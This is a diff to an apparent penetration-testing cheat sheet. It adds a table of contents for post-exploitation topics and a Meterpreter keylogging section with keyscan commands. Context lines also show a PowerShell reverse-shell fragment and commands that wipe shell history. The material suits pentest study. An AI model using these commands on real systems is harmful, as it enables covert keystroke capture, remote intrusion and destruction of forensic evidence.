@@ -246,6 +246,20 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.
 ```
 
 ## Post-Exploitation
+- [Windows Local Enumeration](#Windows-Local-Enumeration
+- [Linux Local Enumeration](#Linux-Local-Enumeration)
+- [Transferring Files To Windows and Linux Targets](#Transferring-Files-To-Windows-and-Linux-Targets)
+- [Upgrading Shells](#Upgrading-Shells)
+- [Windows Privilege Escalation](#Windows-Privilege-Escalation)
+- [Linux Privilege Escalation](#Linux-Privilege-Escalation)
+- [Windows Persistence](#Windows-Persistence)
+- [Linux Persistence](#Linux-Persistence)
+- [Dumping and Cracking Windows Hashes](#Dumping-and-Cracking-Windows-Hashes)
+- [Dumping and Cracking Linux Hashes](#Dumping-and-Cracking-Linux-Hashes)
+- [Pivoting](#Pivoting)
+- [Clearing Your Tracks](#Clearing-Your-Tracks)
+- [Keylogging](#Keylogging)
+
 ### Windows Local Enumeration
 #### Enumerating System Information
 ```
@@ -858,5 +872,14 @@ cd /tmp
 cat /dev/null > ~/.bash_history
 history -c
 ```
+
+### Keylogging
+```
+meterpreter > getdesktop
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+```
+- https://www.offsec.com/metasploit-unleashed/keylogging/
 
 ## Social Engineering
